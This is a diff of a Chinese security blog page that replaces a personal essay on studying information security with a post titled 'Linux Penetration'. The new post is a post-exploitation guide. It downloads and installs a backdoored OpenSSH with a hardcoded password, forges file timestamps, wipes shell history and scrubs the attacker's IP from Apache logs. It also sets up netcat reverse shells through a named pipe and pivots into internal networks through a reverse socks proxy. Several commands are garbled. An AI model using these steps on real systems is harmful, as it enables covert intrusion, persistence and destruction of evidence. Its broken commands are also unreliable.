@@ -28,7 +28,7 @@
 
 
 
-  <meta name="keywords" content="生活感悟," />
+  <meta name="keywords" content="NetWorking Penetration," />
 
 
 
@@ -37,19 +37,16 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.4" />
 
 
-<meta name="description" content="在上海学到了很多，也更加了解了信息安全这个专业以及信息安全领域所涉及到的各种各样的“信息”，虽然在此之前对于所学专业的认识已经算是比较全面的了，但是从这次上海之行来看，还是深一层次的了解到了前景发展。
-说到信息安全，我经常到看雪，法克等等论坛交流，广大程序猿都吐槽做安全的没有前端搞开发的薪水多，这是为什么？开玩笑说道：“你也不想想搞开发的要加多少班，工作力度多么的大！”只是笑笑，搞安全的怎么了，">
+<meta name="description" content="写的不够详细，之后会分开详细讲解。正向连接  ssh 后门老牌的SSH后门了，功能稳定">
 <meta property="og:type" content="article">
-<meta property="og:title" content="嘻嘻">
-<meta property="og:url" content="sunsays.net/2014/06/27/嘻嘻/index.html">
+<meta property="og:title" content="Linux Penetration">
+<meta property="og:url" content="sunsays.net/2015/07/20/Linux-Penetration/index.html">
 <meta property="og:site_name" content="SunSays">
-<meta property="og:description" content="在上海学到了很多，也更加了解了信息安全这个专业以及信息安全领域所涉及到的各种各样的“信息”，虽然在此之前对于所学专业的认识已经算是比较全面的了，但是从这次上海之行来看，还是深一层次的了解到了前景发展。
-说到信息安全，我经常到看雪，法克等等论坛交流，广大程序猿都吐槽做安全的没有前端搞开发的薪水多，这是为什么？开玩笑说道：“你也不想想搞开发的要加多少班，工作力度多么的大！”只是笑笑，搞安全的怎么了，">
-<meta property="og:updated_time" content="2015-07-27T13:03:02.492Z">
+<meta property="og:description" content="写的不够详细，之后会分开详细讲解。正向连接  ssh 后门老牌的SSH后门了，功能稳定">
+<meta property="og:updated_time" content="2015-07-31T03:19:58.722Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="嘻嘻">
-<meta name="twitter:description" content="在上海学到了很多，也更加了解了信息安全这个专业以及信息安全领域所涉及到的各种各样的“信息”，虽然在此之前对于所学专业的认识已经算是比较全面的了，但是从这次上海之行来看，还是深一层次的了解到了前景发展。
-说到信息安全，我经常到看雪，法克等等论坛交流，广大程序猿都吐槽做安全的没有前端搞开发的薪水多，这是为什么？开玩笑说道：“你也不想想搞开发的要加多少班，工作力度多么的大！”只是笑笑，搞安全的怎么了，">
+<meta name="twitter:title" content="Linux Penetration">
+<meta name="twitter:description" content="写的不够详细，之后会分开详细讲解。正向连接  ssh 后门老牌的SSH后门了，功能稳定">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -59,7 +56,7 @@
   };
 </script>
 
-    <title> 嘻嘻 // SunSays </title>
+    <title> Linux Penetration // SunSays </title>
 </head>
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 <!--[if lte IE 8]>
@@ -172,7 +169,7 @@
           
           
             
-              嘻嘻
+              Linux Penetration
             
           
         </h1>
@@ -181,8 +178,8 @@
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2014-06-27T20:56:54+08:00" content="2014-06-27">
-            2014-06-27
+          <time itemprop="dateCreated" datetime="2015-07-20T19:26:09+08:00" content="2015-07-20">
+            2015-07-20
           </time>
         </span>
 
@@ -200,15 +197,35 @@
       
 
       
-        <span itemprop="articleBody"><p>在上海学到了很多，也更加了解了信息安全这个专业以及信息安全领域所涉及到的各种各样的“信息”，虽然在此之前对于所学专业的认识已经算是比较全面的了，但是从这次上海之行来看，还是深一层次的了解到了前景发展。</p>
-<p>说到信息安全，我经常到看雪，法克等等论坛交流，广大程序猿都吐槽做安全的没有前端搞开发的薪水多，这是为什么？开玩笑说道：“你也不想想搞开发的要加多少班，工作力度多么的大！”只是笑笑，搞安全的怎么了，<br><a id="more"></a><br>你们开发或者什么的做的不够好，我们来帮你们完善不足之处，这难道不比你们水平更高么？额，我这里只是随便说的某些方面而已。我了解的安全方面大概主要的也就几个方面：Web安全、软件安全、物联网安全….不过我只了解Web和软件安全，还是对于逆向比较有兴趣，渗透方面总觉得不是那么的那个，就是太杂了，虽然逆向的确很是复杂，我也只是学了16位的汇编语言32位稍微看了看罗云彬写的《win32汇编语言程序设计》，然后就开始了我的逆向道路，不过PC端方面不知道以后会不会逐渐衰弱掉，而移动端非常火热，所以浩哥叫我如果有兴趣可以搞搞安卓安全，用户广，还处于初期阶段，ios显然没有安卓用户多，系统安全方面内核方面笑笑，rootkit还是蛮有兴趣的，额，其实弄加密与解密软件安全与小时候总想着破解使用免费软件有关，现在其实还在想我到底该干嘛，安全是一个很大的领域，你可以理论搞得非常好，去研究信息安全理论标准之类的，另外就是实践技术了，想必大部分人都是属于第二种类型的，这就要求必须得掌握精通的技术才能够找到好的工作。然而学校教学制度不能够造就许多人才，人才又分为研究型人才和技术型人才，比如有些人参加ACM比赛能够获得很好的名次，而让他到公司去写商业程序才发现代码中根本不需要用到高效算法和一些特殊的数据结构，这就是Research和Development的区别，有时候学校组织的某些比赛也差不多是这类性质的。等等，我有太多想说的了…</p>
-<p>如果ACM成绩非常好，那么进入这些国际性大公司的概率会非常高，哪怕去不了大公司，中小型公司也非常欢迎这种基础理论扎实的人才，因为他们可以解决别人解决不了的难题，但是这类人才通常要价比较高，很多中小型公司难以承受，同时中小型公司并没有独立的研究部门，所以这类人才进入公司以后通常都是兼有研究和开发两重责任，当然也是处于公司人才金字塔的顶端，享受特殊待遇；开发性人才则是各个类型的公司都需要的，相对来说选择面广一些，但是初始阶段的收入会比研究性人才低一些。你需要根据你的情况来给自己定位，如果是做研究性人才，那么就继续把ACM弄好，多参加ACM大赛，特别是正式的国际性ACM大赛，争取拿奖，同时做好进行研究生学习的的准备（ACM成绩好的话一般都会被科研院所免试录取），在研究生阶段进行进一步的理论研究和培养自己的科研能力，这种方向的话不需要管什么java<br>web开发、Windows程序开发这类的实现性技术，只需要把算法、模式识别等理论课程学好即可；如果你的定位是开发性人才则把主要精力放到java web开发、Windows程序开发等上边来，如果从事这个方向，因为你已经有一定的ACM的基础了，所以应付面试笔试中的那些算法难题不在话下，那么就在把一部分精力继续投入在ACM的学习上的同时，把更多的精力投入到这些商业程序开发的技术上去。</p>
-<p>好吧，以上是个人感慨和对专业和计算机方面的一些感想。下面说说这次上海了解到了什么，其实第一天去了解ARM和FPGA等东西我觉着对我没有太大的启发和影响，因为我压根没有想过在软硬件结合的方面去高安全，当然以后或许做安全会碰到，意思是我不想搞硬件，并不是不喜欢搞那个安全啊，话说的有歧义请谅解，因为嵌入式在我们生活中是无处不在的，不可能脱离它去搞有价值的安全的，话不能说太满，这次去上海个人觉得只是稍微给我们说了些基础的东西并没有深入的讲解，毕竟只有一点时间是在认知的，所以大部分的东西还是要自己去学习去了解。不否认做硬件在某些方面更加的吃香，</p>
-<p>就跟Linux和windows区别一样，做Linux总是需求比较大的当然相比windows也相对简单了点。还有就是第二天早上在什么基地的砍伐，其实好多东西我自己都弄过，我就奇怪了，那么多的同学觉得好惊奇，比如那个灰鸽子，其实现在大部分的杀毒软件都能够检测出来，那里只是做个示范，看到安恒信息我又笑了，去年参加过安恒信息赞助的杭州电子科技大学的CTF比赛，排名惨不忍睹，谁让上海交大的0ops队伍和浙江大学还有等等名队参加了呢，一直比较喜欢蓝莲花战队，其实我不知道为什么我们学校就没有组织参加这类比赛的，虽然称不上是什么高端大气上档次的比赛，但至少让感兴趣的同学在计算机的海洋中寻找快乐啊，真的，做哪些题目真的蛮快乐的。</p>
-<p>哎。中国自主开发的系统还是模仿的xp系统，或许是为了让国内用户习惯吧，毕竟大家都习惯了windows操作系统了，其实不管做什么方面我认为最重要的还是要有好的编程能力和开发经验语言有很多种，不求多只求精，更何况我这个还不精的呢……汇编语言其实更加考验思维能力，亲眼看过人家用汇编将几百M的视频压缩成了几K大小，这种汇编大赛也是很有意思的，其实如果真的能够在学习中找到了乐趣，也就不会花多时间在游戏上了，而是在专业技术上，倘若一些基础都不懂，估计连逛论坛都不知道别人在说什么了。</p>
-<p>浩哥总说我们任务进度太慢了，说我们大一不重视不着急，我其实想说一个星期那么多课，加上晚自习，晚上回去搞搞还断网，时间真的不多，我们也想多花时间在上面，也很着急，大一也就这么过去了，并不像浩哥说的那样我们还小…..我们一眨眼就毕业了，还是要抓紧时间。</p>
-<p>在上海让我感受到了工作的氛围，让我想到3年后我是否能够找到一个自己满意的工作，有技术不浪费4年光阴，本科毕业10K+该是满意问题的，但是还是要努力，不然就只是幻想罢了。昨天晚上找了张翼，问他什么时候来，他回答说不确定正在出差，我也就没有去315浩哥哪里，自己肚子里的货不多都不好意思去实验室了，毕竟浩哥给我的木头超级字典我还没破解网络验证。话说回来我和张翼高中校友，还真是巧了，这篇文章我是按照平常自己在博客里写的笔法在博客中发表好了然后拉下来的，修改了一下，就当做这次专业认知的感想一部分吧。</p>
-<p>恩……就暂时写这么多吧，有些话以后再说喽，安全的道路还有点艰难，加油，为了心中的目标——As I do ,As you know !</p>
+        <span itemprop="articleBody"><p>写的不够详细，之后会分开详细讲解。<br>正向连接<br>  ssh 后门<br>老牌的SSH后门了，功能稳定<br><a id="more"></a><br>备份原文件：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.mv <span class="regexp">/etc/</span>ssh<span class="regexp">/ssh_config /</span>etc<span class="regexp">/ssh/</span>ssh_config.old</span><br><span class="line"><span class="number">2</span>.mv <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config /</span>etc<span class="regexp">/ssh/</span>sshd_config.old</span><br></pre></td></tr></table></figure></p>
+<p>3.下载并安装ssh后门：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">shell</span>-<span class="comment"># wget http://www.down.com/sshbd.tgz</span></span><br><span class="line"><span class="built_in">shell</span>-<span class="comment"># tar zxvf sshbd.tgz</span></span><br><span class="line"><span class="built_in">shell</span>-<span class="comment"># cd openssh</span></span><br></pre></td></tr></table></figure></p>
+<p>4.设置ssh后门的登录密码：<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi versio.h</span><br><span class="line">#define <span class="type">SSH_VERSION</span> <span class="string">"OpenSSH_4.2"</span> --&gt; you've <span class="keyword">to</span> edit <span class="type">OpenSSH_4</span>.<span class="number">2</span></span><br><span class="line"></span><br><span class="line">vi includes.h</span><br><span class="line">define _SECRET_PASSWD <span class="string">"123456"</span> -&gt; 后门连接密码</span><br></pre></td></tr></table></figure></p>
+<p>5.编译安装：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">shell</span>-<span class="comment"># ./configure --prefix=/usr --sysconfdir=/etc/ssh</span></span><br><span class="line"><span class="built_in">shell</span>-<span class="comment"># make &amp;&amp; make install</span></span><br><span class="line"><span class="built_in">shell</span>-<span class="comment"># cp ssh_config sshd_config /etc/ssh/</span></span><br></pre></td></tr></table></figure></p>
+<p>修改文件时间:<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch -r  <span class="regexp">/etc/</span>ssh<span class="regexp">/ssh_config.old /</span>etc<span class="regexp">/ssh/</span>ssh_config</span><br><span class="line">touch -r  <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config.old /</span>etc<span class="regexp">/ssh/</span>sshd_config</span><br></pre></td></tr></table></figure></p>
+<p>重启服务<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">shell</span>-<span class="comment"># /etc/init.d/sshd restart</span></span><br></pre></td></tr></table></figure></p>
+<p>6、登入后门：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="operator">-l</span> root IP</span><br><span class="line">password：<span class="number">123456</span></span><br><span class="line"><span class="built_in">echo</span> &gt;/root/.bash_<span class="built_in">history</span> //清空操作日志</span><br></pre></td></tr></table></figure></p>
+<p>7、清除apache日志：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HISTFILE=/dev/null</span><br><span class="line"><span class="built_in">export</span> HISTSIZE=<span class="number">0</span></span><br><span class="line"><span class="built_in">cd</span> /etc/httpd/logs/</span><br><span class="line">sed -i <span class="string">'/IP/d'</span> access_<span class="built_in">log</span>*</span><br></pre></td></tr></table></figure></p>
+<p><a href="http://gaga1.blogbus.com/logs/86451661.html" target="_blank" rel="external">http://gaga1.blogbus.com/logs/86451661.html</a><br><a href="http://drops.wooyun.org/tips/1951" target="_blank" rel="external">http://drops.wooyun.org/tips/1951</a> 乌云知识。。。<br>参考文章：<br><a href="http://zone.wooyun.org/content/5064" target="_blank" rel="external">http://zone.wooyun.org/content/5064</a><br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br>反向shell</p>
+<p>telnet shell（后门<br>    管道实现<br>udp shell    python脚本<br>    zone.wooyun.org/content/6041<br>nc（管道方式）反弹shell<br>        mkmod /tmp/backpipe p<br>        /bin/sh  0 /tmp/backpipe<br>转换成 交换式shell<br>    Python -c  ‘ import pyt ; pty.spwam(“/bin/sh”) ‘</p>
+<p>不被history命令 记录     export HISTSIZE=0<br>其他入口<br>public key sshd<br>ssh的登录验证方式<br>ssh 端口转发<br>ssh user@Host2 N -f R1250::1080<br>SSH端口转发分为两种，一种是本地端口转发，又称为本地SSH隧道。一直是远程端口转发。SSH端口转发，还必须指定数据传送的目标主机，从而形成点对点的端口转发。<br>本地端口转发<br>假定有三台主机A、B、C。由于种种原因(无论是防火墙还是路由原因)，AC两台主机之间无法连通。但是B却可以和A、C连通。这时候就可以用本地端口转发来实现A和C通过B来连通。<br>    A  192.168.7.27<br>    B  192.168.6.19<br>    C  192.168.30.68</p>
+<p>6网段和7网段、30网段都相通，但是7网段和30网段不通，现在需要从7网段访问30网段的一个web服务，可以通过本地端口转发来实现。首先确保A、B的ssh服务都开启了允许转发：GatewayPorts yes、AllowTcpForwarding yes</p>
+<p>在A上面执行下面的命令：</p>
+<p>1    ssh -l test -L 192.168.7.27:59000:192.168.30.68:80 192.168.6.19<br>参数-L后面总共有四个用冒号分割的值，分别是’本地地址:本地端口:目标主机:目标主机端口’。这条命令的意思，就是指定SSH绑定本地192.168.7.27的59000端口，然后指定 192.168.6.19将所有的数据，转发到目标主机192.168.30.68的80端口。</p>
+<p>如此，我们只要在A上连接A本地地址的59000端口，就等于连上了192.168.30.68的80端口。</p>
+<p>1.curl <a href="http://192.168.7.27:59000/" target="_blank" rel="external">http://192.168.7.27:59000/</a></p>
+<p>这种本地端口转发适合于A是企业局域网机器，B、C均为广域网上的有独立公网IP的机器，但是企业的防火墙阻止了A和C直接的通讯，但是却允许A和B通讯，这样A就可以通过B和C进行通讯。<br>远程端口转发</p>
+<p>假定有三台主机A、B、C。A是企业内部局域网的机器，B是企业内部一台具即有私网IP又有公网IP的服务器(类似网关)，C是Internet上具有公网IP的服务器，A可以直接连接到C，B可以直接连接A(内网)，也可以直接连接C(公网)，但是由于A在内网，所以C不能直接连接A，但是C可以通过B连接A。<br>     A  10.1.6.234<br>     B  114.80.130.88/10.1.10.1<br>     C  119.75.218.77<br>在B上执行以下命令：<br>1    ssh -l taomee -p 58000 -R 10.1.10.1:59000:10.1.6.234:80 119.75.218.77<br>在C上执行以下命令：<br>1.curl <a href="http://10.1.6.234" target="_blank" rel="external">http://10.1.6.234</a></p>
+<p>端口重定向</p>
+<p>sock5<br>随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认web服务端口80、MSSQL数据库服务端口1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开来，利用相关的策略有效避免或减轻来自外部的攻击。<br>对于渗透测试者来说，如何绕过防火墙的阻挡在内网展开渗透测试成为亟需解决的问题，本文介绍了在夺取映射到外网的内网服务器权限后，如何利用socks代理反弹获得内网访问权限。</p>
+<ol>
+<li>sSocks<br>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13，可在以下链接处下载。<br><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="external">http://sourceforge.net/projects/ssocks/</a><br>下载解压后，执行命令编译。<br>./configure &amp;&amp; make<br>编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下：<br>程序 功能<br>nsocks 类似通过Socks5代理后的netcat，可用来测试socks server<br>ssocksd 用来开启Socks5代理服务<br>ssocks 本地启用Socks5服务，并反弹到另一IP地址<br>rcsocks 接收反弹过来的Socks5服务，并转向另一端口<br>2.模拟网络环境说明<br>本文模拟的网络环境见下图1，渗透测试端IP为192.168.10.50，内网区域IP段192.168.206.0/24，内网区域能正常访问192.168.10.0/24，现假设已获得192.168.206.130权限。 </li>
+</ol>
+<p>3.实施Socks代理反弹<br>1)本地监听端口<br>在渗透测试端192.168.10.50执行<br>./rcsocks -l 1088 -p 1080 -vv<br>等待远程Socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道 </p>
+<p>2)开启Socks5代理服务，反弹<br>在192.168.206.130上执行<br>./rssocks -vv -s 192.168.10.50:1080<br>启用Socks5服务，反弹到192.168.10.50的端口1080上</p>
+<p>此时在渗透测试端192.168.10.50可看到通道连接成功</p>
+<p>nc反弹shell<br><a href="http://www.freebuf.com/articles/system/10632.html乌云" target="_blank" rel="external">http://www.freebuf.com/articles/system/10632.html乌云</a><br>对于瑞士军刀nc我们再熟悉不过了，经常被用来进行数据包发送，文件传送以及反弹shell。在渗透测试过程中如果想反弹shell我们通常的做法是：<br>nc -l -vv -p 2222 -e /bin/bash<br>在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个<br>GAPING_SECURITY_HOLE常量)，也就是说我们不能通过-e选项绑定目标的shell，使得我们在利用上受到限制，但这种情况下是不是就<br>没办法利用了呢？天无绝人之路，来看下面的TIP。</p>
+<p>在Attack这边依然用nc -lnvp listenport监听某端口，在目标环境中依次执行以下命令：<br>root@bt:~#mknod /tmp/backpipe p<br>root@bt:~#/bin/sh 0/tmp/backpipe<br>第一条命令使用mknod在tmp目录下创建一个管道backpipe，第二条命令首先将默认shell环境的输入<br>重定向给刚才创建的管道，然后将输出通过nc attackerip<br>listenport重定向到攻击者一端，最后将shell的执行结果再重定向到管道中。</p>
+<p>网上查了下mknod命令，说是只能root用户才有权限执行，可是经过测试普通权限的用户也可以创建管道等特殊文件，如果没有权限使用mkfifo /tmp/backpipe也可以创建一个管道。</p>
 </span>
       
     </div>
@@ -217,7 +234,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/生活感悟/" rel="tag">#生活感悟</a>
+            <a href="/tags/NetWorking-Penetration/" rel="tag">#NetWorking Penetration</a>
           
         </div>
       
@@ -226,13 +243,13 @@
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/07/10/从WordPress搬到HEXO/" rel="prev">从WordPress搬到HEXO</a>
+              <a href="/2015/07/22/堆栈攻击概要/" rel="prev">堆栈攻击概要</a>
             
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2014/02/28/WIN7下配置JDK环境变量/" rel="next">WIN7下配置JDK环境变量</a>
+              <a href="/2015/07/17/group/" rel="next">group</a>
             
           </div>
         </div>
